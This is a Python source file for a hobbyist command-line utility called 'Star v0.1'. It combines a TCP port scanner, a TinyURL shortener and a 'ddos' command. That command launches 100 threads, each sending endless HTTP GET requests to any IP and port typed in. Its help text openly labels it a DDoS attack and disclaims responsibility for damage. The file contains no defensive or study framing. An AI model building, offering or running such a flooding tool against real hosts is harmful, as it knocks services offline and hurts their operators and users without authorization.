from yaspin import yaspin, Spinner
from yaspin.spinners import Spinners
from colorama import Fore
from datetime import datetime
import pyfiglet
import platform
import os
import time
import requests
from pathlib import Path
import socket
import threading

## Normal functions ##

def get_current_military_time():
    return datetime.now().strftime("%H:%M")

def get_current_directory():
    return Path.cwd()

## Essential functions ##

def help():
    print("""
▶ help [shows this page]
▶ clear [clears the screen]
▶ scan [scans a port]
▶ ddos [performs a DDoS attack *im not responsible for damages*]
▶ urlshortener [shortens a URL]
""")

def clear():
    if platform.platform().startswith('Linux'):
        os.system("clear")
    elif platform.platform().startswith('Windows'):
        os.system("cls")
    else:
        print("Unknown operating system")

def scan_port(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((ip, port))
        if result == 0:
            return True
        else:
            return False
    except socket.error as e:
        print(f"{Fore.RED}Error: {e}{Fore.RESET}")
        return None

def ddos(ip, port):
    while True:
        try:
            requests.get(f"http://{ip}:{port}")
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}Error: {e}{Fore.RESET}")

def shorten_url(url):
    api_url = "http://tinyurl.com/api-create.php"
    params = {"url": url}
    response = requests.get(api_url, params=params)
    return response.text

def main():
    clear()
    menu = pyfiglet.figlet_format(font="graffiti", text="Star v0.1")
    print(Fore.YELLOW + menu)
    print()
    print()

## Start application ##
if __name__ == "__main__":
    main()
    with yaspin(Spinners.arc, text=f"{Fore.YELLOW}Loading{Fore.RESET}", color="yellow") as sp:
        def check():
            url = "https://www.google.com"
            timeout = 10
            try:
                request = requests.get(url,
                           timeout=timeout)
                sp.write(f"{Fore.GREEN}[  OK  ]{Fore.YELLOW} Internet established ✓{Fore.RESET}")
 
            except (requests.ConnectionError,
                requests.Timeout) as exception:
                sp.write(f"{Fore.RED}[  FAILED  ]{Fore.YELLOW} Internet unestablished ✗{Fore.RESET}")
                sp.write(f"{Fore.YELLOW}Please connect to an internet connection to use star")
        check()   
        print()
    print(f"{Fore.YELLOW}Type help to get a list of commands{Fore.RESET}")
    while True:
        print()
        time = get_current_military_time()
        directory = get_current_directory()
        print(f"{Fore.YELLOW}{time} ✪ {directory}{Fore.RESET}")
        opt = input(f"{Fore.YELLOW}▶ ")
        if opt.startswith('clear'):
            clear()
        elif opt.startswith('help'):
            help()
        elif opt.startswith('scan'):
            try:
                ip = opt.split(' ')[1]
                port = int(opt.split(' ')[2])
                with yaspin(Spinners.arc, text=f"{Fore.YELLOW}Scanning port {port} on {ip}{Fore.RESET}", color="yellow") as sp:
                    result = scan_port(ip, port)
                    if result is True:
                        sp.write(f"{Fore.GREEN}[  OPEN  ]{Fore.YELLOW} Port {port} is open on {ip} ✓{Fore.RESET}")
                    elif result is False:
                        sp.write(f"{Fore.RED}[  CLOSED  ]{Fore.YELLOW} Port {port} is closed on {ip} ✗{Fore.RESET}")
                    else:
                        sp.write(f"{Fore.RED}[  ERROR  ]{Fore.YELLOW} An error occurred while scanning port {port} on {ip} ✗{Fore.RESET}")
            except IndexError:
                print(f"{Fore.RED}Error: Invalid syntax. Use 'scan <ip> <port>'{Fore.RESET}")
        elif opt.startswith('ddos'):
            try:
                ip = opt.split(' ')[1]
                port = int(opt.split(' ')[2])
                threads = []
                for _ in range(100):
                    thread = threading.Thread(target=ddos, args=(ip, port))
                    thread.start()
                    threads.append(thread)
                for thread in threads:
                    thread.join()
            except IndexError:
                print(f"{Fore.RED}Error: Invalid syntax. Use 'ddos <ip> <port>'{Fore.RESET}")
        elif opt.startswith('urlshortener'):
            try:
                url = opt.split(' ')[1]
                with yaspin(Spinners.arc, text=f"{Fore.YELLOW}Shortening URL{Fore.RESET}", color="yellow") as sp:
                    shortened_url = shorten_url(url)
                    sp.write(f"{Fore.GREEN}[  OK  ]{Fore.YELLOW} URL shortened: {shortened_url}{Fore.RESET}")
            except IndexError:
                print(f"{Fore.RED}Error: Invalid syntax. Use 'urlshortener <url>'{Fore.RESET}")
        else:
            if opt:
                print(f"{Fore.YELLOW}{opt}: function not found{Fore.RESET}")
            if not opt:
                pass
